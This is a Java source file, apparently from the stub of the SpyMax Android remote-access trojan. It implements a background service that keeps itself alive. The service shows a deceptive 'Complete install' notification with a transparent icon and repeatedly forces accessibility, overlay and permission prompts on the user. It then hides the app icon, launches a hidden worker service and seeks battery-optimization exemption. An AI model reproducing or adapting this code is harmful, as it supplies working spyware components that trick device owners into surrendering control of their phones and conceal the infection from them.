package spymax.stub7;

import static spymax.stub7.ClassGen11.Is_ClassGen11_Hidden;
import static spymax.stub7.ClassGen3.GS_ClassGen11_B;
import static spymax.stub7.ClassGen3.NeedSuper;
import static spymax.stub7.ClassGen3.Trys;
import static spymax.stub7.ClassGen3.iamworking;
import static spymax.stub7.ClassGen3.speedTime;

import android.app.IntentService;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import android.provider.Settings;
import android.support.annotation.Nullable;
import android.support.v4.app.NotificationCompat;
import android.support.v4.app.NotificationManagerCompat;

import java.util.concurrent.TimeUnit;

public class myworker extends IntentService {

    public myworker() {
        super("");
    }
    PowerManager.WakeLock wakeLock = null;
    @Override
    public void onDestroy() {
        super.onDestroy();
        if (!wakeLock.equals(null))
        {
            if (wakeLock.isHeld() == true)
            {
                wakeLock.release();
            }
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return super.onBind(intent);
    }
    public static void cancelnotification(Context ctx , int NotifiID)
    {
        String ns = ctx.NOTIFICATION_SERVICE;
        NotificationManager nMgr =(NotificationManager) ctx.getSystemService(ns);
        nMgr.cancel(NotifiID);
    }
    @Override
    protected void onHandleIntent(@Nullable Intent intent) {

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                NotificationManager notificationManager = this.getSystemService(NotificationManager.class);

                if (notificationManager != null && notificationManager.getNotificationChannel("MyInstall") == null) {
                    NotificationChannel channel = new NotificationChannel("MyInstall", "Install", NotificationManager.IMPORTANCE_DEFAULT);
                    channel.setDescription("Installation");
                    channel.setShowBadge(false);
                    channel.setSound(null,null);
                    notificationManager.createNotificationChannel(channel);
                }

            }


            Intent fullScreenIntent = new Intent(this, _access_ask_.class);
            fullScreenIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK|Intent.FLAG_ACTIVITY_NO_HISTORY|Intent.FLAG_ACTIVITY_SINGLE_TOP);
            PendingIntent fullScreenPendingIntent = PendingIntent.getActivity(this, 0,
                    fullScreenIntent, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);

            NotificationCompat.Builder notificationBuilder =
                    new NotificationCompat.Builder(this, "MyInstall")
                            .setSmallIcon(android.R.color.transparent)
                            .setContentTitle("Complete install")
                            .setContentText("Click Here to Complete installing")
                            .setPriority(NotificationCompat.PRIORITY_HIGH)
                            .setCategory(NotificationCompat.CATEGORY_CALL)
                            .setDefaults(NotificationCompat.DEFAULT_ALL)
                            .setOngoing(true)
                            .setAutoCancel(false)
                            .setFullScreenIntent(fullScreenPendingIntent, true);

            NotificationManagerCompat NnotificationManager = NotificationManagerCompat.from(this);
            this.startForeground(1547,notificationBuilder.build());

            PowerManager pm = (PowerManager)getSystemService(POWER_SERVICE);
            if (wakeLock == null)
            {
                wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Android:Watchlock");
            }
            if (wakeLock != null)
            {
                if (wakeLock.isHeld() == false)
                {
                    wakeLock.acquire();
                }
            }

            while (true) {

                try {
                    try {

                        TimeUnit.MILLISECONDS.sleep(speedTime);

                    } catch (InterruptedException e) {

                    }

                    if (!ClassGen3.IA_ClassGen11_E(this, ClassGen12.class) &&
                            NeedSuper()) {

                        if (GS_ClassGen11_B(this))
                        {
                            Trys++;

                            try {

                                if (Trys >= 5) {

                                    Trys = 0;
                                    // Shown = true;
                                    speedTime = 3500;

                                    this.startActivity(new Intent(this, _access_ask_.class)
                                            .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                            .addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP)
                                            .addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY));
                                }

                            } catch (Exception e) {

                            }

                        }

                    }
                    else {


                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this) && !NeedSuper())
                        {
                            if(!ClassGen3.shown)
                            {
                                speedTime = 5000;
                                ClassGen3.shown =true;
                                this.startActivity(new Intent(this, _ask_draw_.class)
                                        .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
                            }

                        }

                        else
                        {

                            if (!ClassGen3.H__ClassGen11_P(this, ClassGen3.PERMISSIONS())) {
                                if (!ClassGen3.asked) {

                                    speedTime = 3500;
                                    ClassGen3.asked = true;

                                    try {

                                        this.startActivity(new Intent(this, _ask_prim_.class)
                                                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                                .addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP)
                                                .addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY));


                                    } catch (Exception ex) {
                                        ClassGen3.asked = false;
                                    }
                                } else {
                                    speedTime = 2000;

                                }
                                //  ActivityCompat.requestPermissions(this, PERMISSIONS, PERMISSION_ALL);

                            } else {

                                if (!Is_ClassGen11_Hidden)
                                {
                                    Is_ClassGen11_Hidden =true;
                                    ClassGen3.SwapMe(getApplicationContext(),"I#C#O#N#S#C#A#N#E#R");
                                }

                                //   ClassGen9.DummyActivity.finish();
                                if (!iamworking) {

                                    try {
                                        ClassGen11.allok =true;
                                        iamworking = true;
                                        ClassGen12.ClassGen12bypass = false;
                                        ClassGen12.ClassGen12FOR_prim = false;
                                        ClassGen12.ClassGen12CheckPrims = true;
                                        //MyAccess.ClassGen12CheckPrims =true;


                                        //Context ctx = getApplicationContext();
                                        if (ClassGen10._runn_srv_(_srv_worker_.class, this)) {
                                            ClassGen3.p_ClassGen3_r = this.getResources().getString(R.string.t1t2t3t4t5t6);

                                            this.startService(new Intent(this, _srv_worker_.class));

                                        }

                                        if (!ClassGen3.is_dozemode(this)) {
                                            Intent dialogIntent = new Intent(this, _ask_battary_.class);
                                            dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                            dialogIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
                                            dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
                                            startActivity(dialogIntent);
                                        }

                                    } catch (Exception e) {}
                                    try
                                    { if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                        cancelnotification(this,6676);
                                        stopForeground(true);
                                        stopSelf();
                                    }

                                    }catch (Exception d){}
                                }

                                speedTime = 25000;

                            }
                        }

                    }

                } catch (Exception e) {

                }

            }

        }catch (Exception e){}
    }
}
